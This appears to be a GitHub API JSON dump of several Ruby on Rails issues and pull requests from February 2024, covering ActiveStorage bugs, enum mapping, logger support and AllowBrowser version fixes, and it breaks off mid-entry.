            "merged_at": "2024-02-19T16:55:10Z"
        },
        "body": "Backport https://github.com/rails/rails/pull/50972 to `7-1-stable` as we already removed codespell from `7-1-stable` as well https://github.com/rails/rails/pull/50746\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51128/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51128/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51127",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51127/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51127/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51127/events",
        "html_url": "https://github.com/rails/rails/issues/51127",
        "id": 2142754949,
        "node_id": "I_kwDNIULOf7fYhQ",
        "number": 51127,
        "title": "Rails 7.1: `ActiveRecord::Base#query_constraints` and composite keys are incompatible with ActiveStorage",
        "user": {
            "login": "Slotos",
            "id": 314453,
            "node_id": "MDQ6VXNlcjMxNDQ1Mw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/314453?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Slotos",
            "html_url": "https://github.com/Slotos",
            "followers_url": "https://api.github.com/users/Slotos/followers",
            "following_url": "https://api.github.com/users/Slotos/following{/other_user}",
            "gists_url": "https://api.github.com/users/Slotos/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Slotos/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Slotos/subscriptions",
            "organizations_url": "https://api.github.com/users/Slotos/orgs",
            "repos_url": "https://api.github.com/users/Slotos/repos",
            "events_url": "https://api.github.com/users/Slotos/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Slotos/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-19T16:28:00Z",
        "updated_at": "2024-02-20T23:22:21Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record/railtie\"\r\nrequire \"active_storage/engine\"\r\nrequire \"tmpdir\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.load_defaults Rails::VERSION::STRING.to_f\r\n\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.eager_load = false\r\n  config.session_store :cookie_store, key: \"cookie_store_key\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  config.active_storage.service = :local\r\n  config.active_storage.service_configurations = {\r\n    local: {\r\n      root: Dir.tmpdir,\r\n      service: \"Disk\"\r\n    }\r\n  }\r\nend\r\n\r\nENV[\"DATABASE_URL\"] = \"sqlite3::memory:\"\r\n\r\nRails.application.initialize!\r\n\r\nrequire ActiveStorage::Engine.root.join(\"db/migrate/20170806125915_create_active_storage_tables.rb\").to_s\r\n\r\nActiveRecord::Schema.define do\r\n  CreateActiveStorageTables.new.change\r\n\r\n  create_table :users, force: true do |t|\r\n    t.bigint :tenant_id, null: false\r\n    t.index [:tenant_id, :id], unique: true\r\n  end\r\n\r\n  create_table :cats, primary_key: [:breed, :color], force: true do |t|\r\n    t.string :color, null: false\r\n    t.string :breed, null: false\r\n  end\r\nend\r\n\r\nclass User < ActiveRecord::Base\r\n  query_constraints :tenant_id, :id\r\n\r\n  has_one_attached :profile\r\nend\r\n\r\nclass Cat < ActiveRecord::Base\r\n  has_one_attached :profile\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_upload_and_download_query_constraint\r\n    user = User.create!(\r\n      tenant_id: 42,\r\n      profile: {\r\n        content_type: \"text/plain\",\r\n        filename: \"dummy.txt\",\r\n        io: ::StringIO.new(\"dummy\"),\r\n      }\r\n    )\r\n\r\n    assert_equal \"dummy\", user.profile.download\r\n  end\r\n\r\n  def test_upload_and_download_primary_key\r\n    cat = Cat.create!(\r\n      breed: \"cat\",\r\n      color: \"orange\",\r\n      profile: {\r\n        content_type: \"text/plain\",\r\n        filename: \"dummy.txt\",\r\n        io: ::StringIO.new(\"dummy\"),\r\n      }\r\n    )\r\n\r\n    assert_equal \"dummy\", cat.profile.download\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nSince ActiveStorage storage tables are not configurable, it should simply work. Attaching a file should result in an attached file.\r\n\r\n### Actual behavior\r\n\r\n`query_constraints` route results in an attempt to query non-existing columns on `active_storage_attachments`. Redefining relations on a model doesn't help, since inverse `belong_to` association then attempts to compare two columns to one in `ActiveRecord::AutosaveAssociation#compute_primary_key`.\r\n\r\nComposite primary key route doesn't work, unless the key contains `:id` column.\r\n\r\n### Notes\r\n\r\nThis is kind-of solvable by adding exttra columns to `active_storage_attachments`, but that can get out of hand real fast.\r\n\r\nIncidentally, allowing `belongs_to` to accept an array `primary_key`, would solve the problem by letting the record have a regular `id` for use by ActiveSupport, but configure relations between models using composite keys. Right now, [this route doesn't work](https://github.com/rails/rails/issues/50850) due to `ActiveRecord::Reflection::BelongsToReflection#association_primary_key` transforming `primary_key` option with `to_s`.\r\n\r\n### System configuration\r\n\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.3.0",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51127/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51127/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51126",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51126/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51126/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51126/events",
        "html_url": "https://github.com/rails/rails/pull/51126",
        "id": 2142654048,
        "node_id": "PR_kwDNIULOZ02-OA",
        "number": 51126,
        "title": "Action Cable `assert_broadcasts` API docs [ci skip]",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-19T15:38:10Z",
        "updated_at": "2024-02-19T16:03:08Z",
        "closed_at": "2024-02-19T15:49:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51126",
            "html_url": "https://github.com/rails/rails/pull/51126",
            "diff_url": "https://github.com/rails/rails/pull/51126.diff",
            "patch_url": "https://github.com/rails/rails/pull/51126.patch",
            "merged_at": "2024-02-19T15:49:28Z"
        },
        "body": "### Motivation / Background\r\n\r\nFollow-up to [#48798][]\r\nReverts [#47837][]\r\n\r\n\r\n### Detail\r\n\r\nThe `capture_broadcasts` helper was introduced in [#48798][] to remove the return value from the `assert_broadcasts` call. The behavior was changed, but the corresponding documentation for the `assert_broadcasts` method did not revert the changes added in [#47837][].\r\n\r\n### Additional information\r\n\r\nThis change should probably also get backported to `7-1-0-stable`.\r\n\r\n[#47837]: https://github.com/rails/rails/pull/47837\r\n[#48798]: https://github.com/rails/rails/pull/48798",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51126/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51126/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51125",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51125/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51125/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51125/events",
        "html_url": "https://github.com/rails/rails/pull/51125",
        "id": 2142284387,
        "node_id": "PR_kwDNIULOZ0ilxA",
        "number": 51125,
        "title": "Support filenames in `Logger.logger_outputs_to?`",
        "user": {
            "login": "c960657",
            "id": 111346,
            "node_id": "MDQ6VXNlcjExMTM0Ng==",
            "avatar_url": "https://avatars.githubusercontent.com/u/111346?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/c960657",
            "html_url": "https://github.com/c960657",
            "followers_url": "https://api.github.com/users/c960657/followers",
            "following_url": "https://api.github.com/users/c960657/following{/other_user}",
            "gists_url": "https://api.github.com/users/c960657/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/c960657/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/c960657/subscriptions",
            "organizations_url": "https://api.github.com/users/c960657/orgs",
            "repos_url": "https://api.github.com/users/c960657/repos",
            "events_url": "https://api.github.com/users/c960657/events{/privacy}",
            "received_events_url": "https://api.github.com/users/c960657/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-19T12:41:40Z",
        "updated_at": "2024-02-20T22:31:23Z",
        "closed_at": "2024-02-20T22:31:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51125",
            "html_url": "https://github.com/rails/rails/pull/51125",
            "diff_url": "https://github.com/rails/rails/pull/51125.diff",
            "patch_url": "https://github.com/rails/rails/pull/51125.patch",
            "merged_at": "2024-02-20T22:31:23Z"
        },
        "body": "`Logger.logger_outputs_to?` only supports `STDOUT` and `STDERR`, not `File` objects or plain filenames.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51125/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51125/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51124",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51124/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51124/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51124/events",
        "html_url": "https://github.com/rails/rails/pull/51124",
        "id": 2141755448,
        "node_id": "PR_kwDNIULOZ0Fltw",
        "number": 51124,
        "title": "Map enums using array to the correct column type",
        "user": {
            "login": "lazaronixon",
            "id": 2651240,
            "node_id": "MDQ6VXNlcjI2NTEyNDA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2651240?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lazaronixon",
            "html_url": "https://github.com/lazaronixon",
            "followers_url": "https://api.github.com/users/lazaronixon/followers",
            "following_url": "https://api.github.com/users/lazaronixon/following{/other_user}",
            "gists_url": "https://api.github.com/users/lazaronixon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lazaronixon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lazaronixon/subscriptions",
            "organizations_url": "https://api.github.com/users/lazaronixon/orgs",
            "repos_url": "https://api.github.com/users/lazaronixon/repos",
            "events_url": "https://api.github.com/users/lazaronixon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lazaronixon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-19T08:04:04Z",
        "updated_at": "2024-02-22T03:34:36Z",
        "closed_at": "2024-02-22T03:34:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51124",
            "html_url": "https://github.com/rails/rails/pull/51124",
            "diff_url": "https://github.com/rails/rails/pull/51124.diff",
            "patch_url": "https://github.com/rails/rails/pull/51124.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\n\r\nPreviously enums without keywords were always mapped to integers and indexed by position, now it is converted based on the column type, it works for strings and database enums as well.\r\n\r\n```ruby\r\n# Before\r\nenum status: { proposed: \"proposed\", written: \"written\", published: \"published\" }\r\n\r\n# After\r\nenum status: [:proposed, :written, :published]\r\n```\r\n\r\n### Detail\r\n\r\nThis Pull Request closes #47278\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51124/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51124/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51123",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51123/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51123/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51123/events",
        "html_url": "https://github.com/rails/rails/issues/51123",
        "id": 2141654716,
        "node_id": "I_kwDNIULOf6cOvA",
        "number": 51123,
        "title": "ActionView::Template::Error (undefined method `variant' for an instance of ActiveStorage::Attached::One):",
        "user": {
            "login": "kashifcodility",
            "id": 157491032,
            "node_id": "U_kgDOCWMfWA",
            "avatar_url": "https://avatars.githubusercontent.com/u/157491032?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kashifcodility",
            "html_url": "https://github.com/kashifcodility",
            "followers_url": "https://api.github.com/users/kashifcodility/followers",
            "following_url": "https://api.github.com/users/kashifcodility/following{/other_user}",
            "gists_url": "https://api.github.com/users/kashifcodility/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kashifcodility/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kashifcodility/subscriptions",
            "organizations_url": "https://api.github.com/users/kashifcodility/orgs",
            "repos_url": "https://api.github.com/users/kashifcodility/repos",
            "events_url": "https://api.github.com/users/kashifcodility/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kashifcodility/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-19T07:00:05Z",
        "updated_at": "2024-02-26T14:40:55Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "i have in my model\r\n\r\n        class Profile < ApplicationRecord\r\n          has_one_attached :photo do |attachable|\r\n             attachable.variant :thumb, resize_to_limit: [100, 100]\r\n          end\r\n        end\r\n\r\nAfter creating proflle \r\n\r\n   @profile.photo.attached?\r\n        => true\r\n       [16] pry(#<#<Class:0x00007f749628aac0>>)> \r\n       [17] pry(#<#<Class:0x00007f749628aac0>>)> \r\n       [18] pry(#<#<Class:0x00007f749628aac0>>)> @profile.photo.url\r\n       NoMethodError: undefined method `url' for an instance of ActiveStorage::Attached::One\r\n       from /home/lap-053/.rbenv/versions/3.3.0-dev/lib/ruby/gems/3.4.0+0/gems/activesupport- \r\n       7.1.3/lib/active_support/core_ext/module/delegation.rb:336 :in `method_missing'\r\n\r\n       [19] pry(#<#<Class:0x00007f749628aac0>>)> \r\n       [20] pry(#<#<Class:0x00007f749628aac0>>)> rails_blob_path(@profile.photo)\r\n      NoMethodError: undefined method `filename' for an instance of ActiveStorage::Attached::One\r\n      from /home/lap-053/.rbenv/versions/3.3.0-dev/lib/ruby/gems/3.4.0+0/gems/activesupport- \r\n      7.1.3/lib/active_support/core_ext/module/delegation.rb:336:in `method_missing'\r\n\r\n       [21] pry(#<#<Class:0x00007f749628aac0>>)> \r\n       [22] pry(#<#<Class:0x00007f749628aac0>>)> @profile.photo.variant(:thumb)\r\n       NoMethodError: undefined method `variant' for an instance of ActiveStorage::Attached::One\r\n       from /home/lap-053/.rbenv/versions/3.3.0-dev/lib/ruby/gems/3.4.0+0/gems/activesupport- \r\n       7.1.3/lib/active_support/core_ext/module/delegation.rb:336:in `method_missing'\r\n\r\n       [23] pry(#<#<Class:0x00007f749628aac0>>)> \r\n       [24] pry(#<#<Class:0x00007f749628aac0>>)> @profile.photo.blob.url\r\n       ActiveStorage::Blob Load (0.3ms)  SELECT \"active_storage_blobs\".* FROM \"active_storage_blobs\" WHERE \r\n       \"active_storage_blobs\".\"id\" = $1 LIMIT $2  [[\"id\", 478], [\"LIMIT\", 1]]\r\n        (pry):7\r\n        S3 Storage (52.3ms) Generated URL for file at key: 3jys7zcmi0blkdz9r0y0ffyd95fs (https://bubbliest-staging-testing.s3.ap- \r\n        southeast-2.amazonaws.com/3jys7zcmi0blkdz9r0y0ffyd95fs?response-content- \r\n        disposition=inline%3B%20filename%3D%22iffa.jpeg%22%3B%20filename%2A%3DUTF-8%27%27iffa.jpeg&response-content- \r\n        type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- \r\n        Credential=AKIAWSRNAFXKRHEB736W%2F20240219%2Fap-southeast-2%2Fs3%2Faws4_request&X-Amz- \r\n        Date=20240219T065354Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz- \r\n        Signature=164796ca39b5859c764828debb35903beb8ddd6e61e33037abe98a2a9cf128f5)\r\n\r\n        => \"https://bubbliest-staging-testing.s3.ap-southeast-2.amazonaws.com/3jys7zcmi0blkdz9r0y0ffyd95fs?response-content- \r\n        disposition=inline%3B%20filename%3D%22iffa.jpeg%22%3B%20filename%2A%3DUTF-8%27%27iffa.jpeg&response-content- \r\n           type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- \r\n        Credential=AKIAWSRNAFXKRHEB736W%2F20240219%2Fap-southeast-2%2Fs3%2Faws4_request&X-Amz- \r\n        Date=20240219T065354Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz- \r\n        Signature=164796ca39b5859c764828debb35903beb8ddd6e61e33037abe98a2a9cf128f5\"\r\n\r\nThese methods not working please help.\r\n \r\n            1.     @profile.photo.variant(:thumb)\r\n            2.    @profile.photo.url \r\n           3.      rails_blob_path(@profile.photo)\r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51123/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51123/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51122",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51122/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51122/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51122/events",
        "html_url": "https://github.com/rails/rails/issues/51122",
        "id": 2141570275,
        "node_id": "I_kwDNIULOf6XE4w",
        "number": 51122,
        "title": "`update_all` raises an exception with an empty list of attributes but `update` not",
        "user": {
            "login": "GitToTheHub",
            "id": 13721821,
            "node_id": "MDQ6VXNlcjEzNzIxODIx",
            "avatar_url": "https://avatars.githubusercontent.com/u/13721821?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/GitToTheHub",
            "html_url": "https://github.com/GitToTheHub",
            "followers_url": "https://api.github.com/users/GitToTheHub/followers",
            "following_url": "https://api.github.com/users/GitToTheHub/following{/other_user}",
            "gists_url": "https://api.github.com/users/GitToTheHub/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/GitToTheHub/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/GitToTheHub/subscriptions",
            "organizations_url": "https://api.github.com/users/GitToTheHub/orgs",
            "repos_url": "https://api.github.com/users/GitToTheHub/repos",
            "events_url": "https://api.github.com/users/GitToTheHub/events{/privacy}",
            "received_events_url": "https://api.github.com/users/GitToTheHub/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-19T05:58:21Z",
        "updated_at": "2024-02-20T23:16:53Z",
        "closed_at": "2024-02-20T23:16:53Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nWhen I'm doing\r\n\r\n`model.relations.update_all({})`\r\n\r\nit raises an exception: `ArgumentError: Empty list of attributes to change`\r\n\r\nbut when I do\r\n\r\n`model.update({})`\r\n\r\nthere is no exception and it returns `true`\r\n\r\nWhy is there a difference?\r\n\r\n### Expected behavior\r\nThe behaviour of `update` and `pdate_all` should be equivalent\r\n\r\n### Actual behavior\r\n`update_all` raises an exception with the value `{}`, but `update` not.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51122/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51122/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51121",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51121/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51121/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51121/events",
        "html_url": "https://github.com/rails/rails/pull/51121",
        "id": 2141120480,
        "node_id": "PR_kwDNIULOZzjjrQ",
        "number": 51121,
        "title": "Fix AllowBrowser versions",
        "user": {
            "login": "jamiemccarthy",
            "id": 40373,
            "node_id": "MDQ6VXNlcjQwMzcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/40373?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jamiemccarthy",
            "html_url": "https://github.com/jamiemccarthy",
            "followers_url": "https://api.github.com/users/jamiemccarthy/followers",
            "following_url": "https://api.github.com/users/jamiemccarthy/following{/other_user}",
            "gists_url": "https://api.github.com/users/jamiemccarthy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jamiemccarthy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jamiemccarthy/subscriptions",
            "organizations_url": "https://api.github.com/users/jamiemccarthy/orgs",
            "repos_url": "https://api.github.com/users/jamiemccarthy/repos",
            "events_url": "https://api.github.com/users/jamiemccarthy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jamiemccarthy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-18T18:08:50Z",
        "updated_at": "2024-02-20T17:39:15Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51121",
            "html_url": "https://github.com/rails/rails/pull/51121",
            "diff_url": "https://github.com/rails/rails/pull/51121.diff",
            "patch_url": "https://github.com/rails/rails/pull/51121.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThe new AllowBrowser feature was added in #50505 . It permits setting minimum browser versions for an application, defines and documents a `:modern` version-set as requiring a list of certain features, and adds that option to the default config for new apps.\r\n\r\nThis PR has been created to make two minor corrections to `:modern`, one to its versions, one to its documentation.\r\n\r\n### Detail\r\n\r\n1. In 24264baeae1d57743aa87b4fcb88e55a42cc850a, adjust the `:modern` browser versions to match the description of required features. Specifically, CSS nesting isn't supported by Chrome until 120, Opera until 106 ([1](https://caniuse.com/css-nesting), [2](https://developer.mozilla.org/en-US/docs/Web/CSS/Nesting_selector#browser_compatibility)).\r\n2. In ff0291291a2c93f40c92a306f4fc3025bd8bdbc0, remove badging from the documentation's list of required features, because it's still a [spec](https://www.w3.org/TR/badging/) that isn't fully implemented by any current browser ([1](https://caniuse.com/mdn-api_notification_badge), [2](https://developer.mozilla.org/en-US/docs/Web/API/Badging_API#browser_compatibility)).\r\n\r\n### Additional information\r\n\r\nPersonally I'm not convinced this feature will be a good default for new apps, but if it's going to be offered, it should be correct for its stated purpose.\r\n\r\nFor fun, I benchmarked `UserAgent.parse.browser` on my laptop and it runs in about 40 microseconds, which is faster than I'd expected. But the runtime `require \"useragent\"` added 30 milliseconds to the first request.\r\n\r\nThe `useragent` gem was [last updated](https://github.com/gshutler/useragent) five years ago, and its browser recognition code is all [7 to 9 years old](https://github.com/gshutler/useragent/tree/master/lib/user_agent/browsers). It seems inappropriate to have a `:modern` default that doesn't recognize Edge (2015). There's a [fork by art19](https://github.com/art19/useragent) that recognizes Edge, but it adds 54 other browsers too, so it has 4x 